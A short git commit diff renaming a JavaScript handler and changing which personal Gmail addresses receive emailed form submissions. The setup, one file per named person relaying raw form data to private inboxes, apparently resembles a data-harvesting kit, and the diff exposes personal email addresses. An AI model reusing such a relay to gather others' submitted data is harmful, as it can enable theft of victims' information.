59579eca2a7ca6b6f98663ee70df3e96b3ed267c
tufailacjsm37-design <tufailacjsm37@gmail.com>
2026-07-10 20:02:23 +0500

    Update and rename aayan.js to Jawad.js

--- Jawad.js
+++ Jawad.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <t26660135@gmail.com>`,
-      to: "ta0134750@gmail.com,ayanali1288383@gmail.com",
-      subject: "aayan",
+      to: "ta0134750@gmail.com,jawadniz1234@gmail.com",
+      subject: "Jawad",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
